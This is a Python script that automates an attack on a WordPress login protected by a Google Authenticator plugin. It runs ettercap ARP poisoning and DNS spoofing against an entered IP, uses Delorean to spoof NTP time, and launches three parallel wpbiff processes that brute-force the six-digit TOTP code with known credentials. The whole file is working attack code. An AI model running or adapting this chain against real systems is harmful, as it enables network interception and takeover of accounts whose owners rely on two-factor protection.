import re
import subprocess
from datetime import datetime
import shlex

import pexpect

ip_regex = "^([01]?\\d\\d?|2[0-4]\\d|25[0-5])\\." \
           "([01]?\\d\\d?|2[0-4]\\d|25[0-5])\\." \
           "([01]?\\d\\d?|2[0-4]\\d|25[0-5])\\." \
           "([01]?\\d\\d?|2[0-4]\\d|25[0-5])$"

url_regex = r"^https?:\/\/[\w\-]+(\.[\w\-]+)+([\w\-\.,@?^=%&:/~\+#]*[\w\-@?^=%&/~\+#])?\/wp-login\.php$"


def is_valid_ip_address(ip):
    if re.match(ip_regex, ip):
        return True
    else:
        return False


def is_valid_wp_login_url(url):
    if re.match(url_regex, url):
        return True
    else:
        return False


def ettercap(timestamp, server, username, password):
    ip = input("Enter the IP address of the vulnerable server: ")
    # ip = "192.168.43.131"
    if not is_valid_ip_address(ip):
        print(f"[red bold]Error:[/red bold] Ip addres is not valid")
    else:
        cmd = "sudo ettercap -T -M arp /" + ip + "// -P dns_spoof"
        print("Ettercap Starting...")
        p = pexpect.spawn(cmd, timeout=None)

        if not p.eof():
            print("Ettercap Started!", style="bold green")
            print("DNS Spoofing Starting...")

        while not p.eof():
            str_line = str(p.readline())
            if "UDP  " + ip + ":" in str_line:
                print("DNS Spoofing Started!", style="bold green")
                delorean(timestamp, server, username, password)
                break


def delorean(timestamp, server, username, password):
    print("Delorean Starting...")
    cmd = "python3 Delorean-master/delorean.py -d \"" + timestamp + "\""
    p = pexpect.spawn(cmd, timeout=None)

    if not p.eof():
        print("Delorean Started!", style="bold green")

    while not p.eof():
        str_line = str(p.readline())
        if "OSError: [Errno 98] Address already in use" in str_line:
            print("Error: Delorean already Started elsewhere!", style="bold red underline")
            break

        if "Sent to" in str_line:
            hour = (str_line[len(str_line) - 10: len(str_line) - 8])
            time = datetime.strptime(timestamp, '%Y-%m-%d %H:%M')
            time = time.replace(hour=int(hour))
            time = str(time.strftime('%Y-%m-%d %H:%M'))
            wpbiff(time, server, username, password)
            break


def wpbiff(timestamp, server, username, password):
    print("WP-biff Starting...")
    command_wp_biff1 = "sudo wpbiff -t 000000 -m 333333 -u " + username + " -p " + password + " --plugin ga -d \"" + timestamp + "\" \"" + server + "\""
    command_wp_biff2 = "sudo wpbiff -t 333333 -m 666666 -u " + username + " -p " + password + " --plugin ga -d \"" + timestamp + "\" \"" + server + "\""
    command_wp_biff3 = "sudo wpbiff -t 666667 -m 999999 -u " + username + " -p " + password + " --plugin ga -d \"" + timestamp + "\" \"" + server + "\""

    p1 = subprocess.Popen(shlex.split(command_wp_biff1), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    p2 = subprocess.Popen(shlex.split(command_wp_biff2), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    p3 = subprocess.Popen(shlex.split(command_wp_biff3), stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    process = True
    total_cont = 0
    error = False
    while process:
        output1 = p1.stderr.read1().strip().decode("utf8")
        output2 = p2.stderr.read1().strip().decode("utf8")
        output3 = p3.stderr.read1().strip().decode("utf8")

        if "Token: " in output1 and int(output1.split(" ")[1]) > 0 and int(output2.split(" ")[1]) > 333333 and int(
                output3.split(" ")[1]) > 666666:
            cont1 = int(output1.split(" ")[1])
            cont2 = int(output2.split(" ")[1]) - 333333
            cont3 = int(output3.split(" ")[1]) - 666666

            current_advance = cont1 + cont2 + cont3 - total_cont

        if ("Traceback (most recent call last):" in output1 or p1.poll() is not None) and \
                ("Traceback (most recent call last):" in output2 or p2.poll() is not None) and \
                ("Traceback (most recent call last):" in output3 or p3.poll() is not None):
            process = False
            error = True

        if "100%" in output1:
            print(p1.stdout.read().strip().decode("utf8").split("Great Success!")[1])
            process = False

        if "100%" in output2:
            print(p2.stdout.read().strip().decode("utf8").split("Great Success!")[1])
            process = False

        if "100%" in output3:
            print(p3.stdout.read().strip().decode("utf8").split("Great Success!")[1])
            process = False

    if error:
        print(f"[red bold]WPbiff Error:[/red bold] Remote server did not respond. Is it down?")

    p1.terminate()
    p2.terminate()
    p3.terminate()
